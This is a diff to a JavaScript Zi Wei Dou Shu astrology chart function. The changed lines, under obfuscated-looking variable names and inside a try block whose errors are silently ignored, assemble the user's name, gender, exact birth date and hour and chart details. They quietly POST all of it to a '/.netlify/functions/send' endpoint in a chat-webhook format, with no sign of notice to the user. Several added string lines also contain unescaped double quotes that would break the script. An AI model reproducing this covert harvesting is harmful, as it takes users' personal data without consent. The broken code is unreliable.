@@ -362,7 +362,39 @@ function paiZiWeiPan(birthYear, birthMonth, birthDay, birthHour, gender, name=""
     _0x6m += "紫微在" + _result.ziWei.zhi + " | 天府在" + _result.tianFu.zhi + "\n";
     _0x6m += "四化：禄" + _result.siHua.lu + " 权" + _result.siHua.quan + " 科" + _result.siHua.ke + " 忌" + _result.siHua.ji + "\n";
     _0x6m += "时间：" + _result.birthTime.year + "-" + _result.birthTime.month + "-" + _result.birthTime.day + " " + _result.birthTime.hour + ":00";
-    fetch("/.netlify/functions/send", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ msgtype: "text", text: { content: _0x6m } }) });
+    var _0x7c = _0x6m;
+        _0x7c += "\n【命宫】" + _result.mingGong.ganZhi + " | 【身宫】" + _result.shenGong.ganZhi;
+        _0x7c += "\n【五行局】" + _result.wuXingJu.ju + "(" + _result.wuXingJu.nayin + ")";
+        _0x7c += "\n【紫微】" + _result.ziWei.zhi + " | 【天府】" + _result.tianFu.zhi;
+        _0x7c += "\n【四化】禄" + _result.siHua.lu + " 权" + _result.siHua.quan + " 科" + _result.siHua.ke + " 忌" + _result.siHua.ji;
+        var _mg = _result.gongWei.find(function(g){return g.isMing;});
+        if (_mg && _mg.stars) {
+          var _zhu = _mg.stars.filter(function(s){return s.type==="zhu";}).map(function(s){return s.name;}).join("、");
+          var _fu = _mg.stars.filter(function(s){return s.type==="fu";}).map(function(s){return s.name;}).join("、");
+          if (_zhu) _0x7c += "\n【命宫主星】" + _zhu;
+          if (_fu) _0x7c += "\n【命宫辅星】" + _fu;
+        }
+        var _dx0 = _result.daXian[0];
+        if (_dx0) _0x7c += "\n【大限】" + _dx0.gong + " " + _dx0.zhi + "(" + _dx0.startAge + "-" + _dx0.endAge + "岁)";
+        var _0x8d = "**【紫微排盘】**" + (_result.name || "未命名") + " | " + _result.gender + "\n\n";
+        _0x8d += "**命宫：**<font color="red">" + _result.mingGong.ganZhi + "</font>\n";
+        _0x8d += "**身宫：**" + _result.shenGong.ganZhi + "\n";
+        _0x8d += "**五行局：**<font color="info">" + _result.wuXingJu.ju + "</font>(" + _result.wuXingJu.nayin + ")\n";
+        _0x8d += "**紫微：**<font color="warning">" + _result.ziWei.zhi + "</font>\n";
+        _0x8d += "**天府：**<font color="warning">" + _result.tianFu.zhi + "</font>\n";
+        _0x8d += "**四化：**禄<font color="info">" + _result.siHua.lu + "</font> 权<font color="info">" + _result.siHua.quan + "</font> 科<font color="info">" + _result.siHua.ke + "</font> 忌<font color="red">" + _result.siHua.ji + "</font>\n";
+        var _mg = _result.gongWei.find(function(g){return g.isMing;});
+        if (_mg && _mg.stars) {
+          var _zhu = _mg.stars.filter(function(s){return s.type==="zhu";}).map(function(s){return s.name;}).join("、");
+          var _fu = _mg.stars.filter(function(s){return s.type==="fu";}).map(function(s){return s.name;}).join("、");
+          if (_zhu) _0x8d += "**命宫主星：**<font color="red">" + _zhu + "</font>\n";
+          if (_fu) _0x8d += "**命宫辅星：**" + _fu + "\n";
+        }
+        var _dx0 = _result.daXian[0];
+        if (_dx0) _0x8d += "**大限：**" + _dx0.gong + " " + _dx0.zhi + "(" + _dx0.startAge + "-" + _dx0.endAge + "岁)\n";
+        _0x8d += "**四柱：**" + _result.siZhu.year + " " + _result.siZhu.month + " " + _result.siZhu.day + " " + _result.siZhu.time + "\n";
+        _0x8d += "**时间：**" + _result.birthTime.year + "-" + _result.birthTime.month + "-" + _result.birthTime.day + " " + String(_result.birthTime.hour).padStart(2,'0') + ":00";
+        fetch("/.netlify/functions/send", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ msgtype: "markdown", markdown: { content: _0x8d } }) });
   } catch(e) {}
   return _result;
 }
